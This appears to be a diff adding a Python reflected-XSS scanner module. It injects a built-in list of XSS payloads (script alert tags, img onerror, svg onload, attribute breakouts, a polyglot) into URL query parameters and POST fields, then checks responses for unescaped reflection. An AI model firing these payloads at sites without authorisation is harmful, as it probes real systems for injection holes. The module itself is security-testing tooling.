@@ -1,0 +1,249 @@
+"""Falcon MAG Framework - XSS Scanner (Reflected)
+Real payload injection + context-aware detection. No false positives."""
+
+import re
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
+from core.logger import get_logger
+
+log = get_logger("xss")
+
+
+# Real XSS payloads
+PAYLOADS = [
+    # Basic
+    "<script>alert(1)</script>",
+    "<script>alert(document.domain)</script>",
+    # Attribute break
+    '"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",
+    # Image error
+    '"><img src=x onerror=alert(1)>',
+    "'><img src=x onerror=alert(1)>",
+    # SVG
+    "<svg/onload=alert(1)>",
+    # Event handler
+    '" onmouseover=alert(1) x="',
+    "' onmouseover=alert(1) x='",
+    # HTML5
+    "<details open ontoggle=alert(1)>",
+    "<video><source onerror=alert(1)>",
+    # Polyglot
+    "javascript:alert(1)",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+]
+
+# Unique marker to verify reflection
+MARKER = "FalconXSS1337"
+
+
+def _inject_param(url: str, param: str, payload: str) -> str:
+    """Replace one query parameter with payload."""
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    qs[param] = [payload]
+    new_query = urlencode(qs, doseq=True)
+    return urlunparse(parsed._replace(query=new_query))
+
+
+def _find_context(html: str, payload: str) -> dict:
+    """Find where the payload landed in the HTML."""
+    idx = html.find(payload)
+    if idx < 0:
+        # Try finding the marker instead
+        return None
+
+    before = html[max(0, idx - 100):idx]
+    after = html[idx + len(payload):idx + len(payload) + 100]
+
+    # Determine context
+    context_type = "html"
+    if re.search(r"<[^>]*$", before):
+        context_type = "attribute"
+    elif re.search(r"<script[^>]*>[^<]*$", before, re.IGNORECASE):
+        context_type = "script"
+    elif re.search(r'=["\'][^"\']*$', before):
+        context_type = "quoted_attr"
+
+    # Check if payload is unescaped
+    is_raw = True
+    if "&lt;" in before[-30:] or "&gt;" in before[-30:]:
+        is_raw = False
+    if "&quot;" in before[-30:] or "&#" in before[-30:]:
+        is_raw = False
+
+    return {
+        "type": context_type,
+        "before": before[-80:],
+        "after": after[:80],
+        "is_raw": is_raw,
+    }
+
+
+def _collect_test_urls(config, crawl_result) -> list:
+    """Collect URLs with query parameters to test."""
+    urls = set()
+
+    target = config.get("target", "")
+    if "?" in target:
+        urls.add(target)
+
+    if crawl_result:
+        for page in crawl_result.get("pages", []):
+            if "?" in page.get("url", ""):
+                urls.add(page["url"])
+
+    # From crawl_result visited urls
+    if crawl_result:
+        for u in crawl_result.get("visited", []):
+            if "?" in u:
+                urls.add(u)
+
+    return sorted(urls)
+
+
+
+
+def _extract_post_params(config):
+    """Extract POST body params from config (form or JSON).
+
+    Returns list of (param_name, original_value, is_json) tuples.
+    """
+    params = []
+
+    post_data = config.get("_post_data", "") or ""
+    if post_data:
+        try:
+            parsed = parse_qs(post_data, keep_blank_values=True)
+            for k, v in parsed.items():
+                params.append((k, v[0] if v else "", False))
+        except Exception:
+            pass
+
+    post_json = config.get("_post_json", "") or ""
+    if post_json:
+        try:
+            import json as _json
+            data = _json.loads(post_json)
+            if isinstance(data, dict):
+                for k, v in data.items():
+                    params.append((k, str(v), True))
+        except Exception:
+            pass
+
+    return params
+
+
+def run(client, config, crawl_result=None) -> dict:
+    """Run reflected XSS scan."""
+    target = config.get("target", "")
+    log.info(f"💉 XSS Scan on {target}")
+
+    result = {
+        "target": target,
+        "tested": 0,
+        "vulnerable": [],
+        "tested_urls": [],
+        "payloads_used": len(PAYLOADS),
+    }
+
+    # Collect URLs with parameters
+    urls = _collect_test_urls(config, crawl_result)
+
+    if not urls:
+        log.info("  ℹ No URLs with query parameters found")
+
+    log.info(f"  ℹ {len(urls)} URL(s) with parameters")
+
+    for url in urls:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        if not params:
+            continue
+
+        result["tested_urls"].append(url)
+
+        for param in params:
+            for payload in PAYLOADS:
+                result["tested"] += 1
+                test_url = _inject_param(url, param, payload)
+
+                resp = client.scan_request(test_url)
+                if not resp or resp.status == 0:
+                    continue
+
+                # Check if payload is reflected raw
+                if payload in resp.text:
+                    ctx = _find_context(resp.text, payload)
+                    if ctx and ctx.get("is_raw"):
+                        finding = {
+                            "url": url,
+                            "test_url": test_url,
+                            "param": param,
+                            "payload": payload,
+                            "context_type": ctx["type"],
+                            "context_before": ctx["before"],
+                            "context_after": ctx["after"],
+                            "severity": "high",
+                        }
+                        result["vulnerable"].append(finding)
+                        log.warning(f"  ⚠ XSS FOUND: {param} on {url[:60]}")
+                        break  # next param
+
+    # ==========================================================
+    # POST body scanning
+    # ==========================================================
+    post_params = _extract_post_params(config)
+    if post_params:
+        log.info(f"  ℹ {len(post_params)} POST parameter(s) to test")
+        method = config.get("_http_method", "GET")
+        post_json_raw = config.get("_post_json", "") or ""
+        post_data_raw = config.get("_post_data", "") or ""
+
+        for param_name, orig_value, is_json in post_params:
+            for payload in PAYLOADS:
+                result["tested"] += 1
+
+                # Build mutated body
+                try:
+                    if is_json:
+                        import json as _json
+                        body = _json.loads(post_json_raw)
+                        body[param_name] = payload
+                        resp = client.request("POST", target, json=body)
+                    else:
+                        parsed = parse_qs(post_data_raw, keep_blank_values=True)
+                        parsed[param_name] = [payload]
+                        new_body = urlencode(parsed, doseq=True)
+                        resp = client.request("POST", target, data=new_body)
+                except Exception as e:
+                    log.debug("POST inject failed: " + str(e))
+                    continue
+
+                if not resp or resp.status == 0:
+                    continue
+
+                # Check reflection
+                if payload in resp.text:
+                    ctx = _find_context(resp.text, payload)
+                    if ctx and ctx.get("is_raw"):
+                        finding = {
+                            "url": target,
+                            "test_url": target,
+                            "original_url": target,
+                            "injected_url": target,
+                            "param": param_name,
+                            "payload": payload,
+                            "context_type": ctx["type"],
+                            "context_before": ctx["before"],
+                            "context_after": ctx["after"],
+                            "severity": "high",
+                            "method": "POST",
+                            "description": "Reflected XSS in POST param '" + param_name + "'",
+                        }
+                        result["vulnerable"].append(finding)
+                        log.warning(f"  ⚠ XSS (POST) FOUND: {param_name} on {target[:60]}")
+                        break  # next param
+
+    log.info(f"  ✓ Tested: {result['tested']}")
+    log.info(f"  ⚠ Vulnerable: {len(result['vulnerable'])}")
+    return result
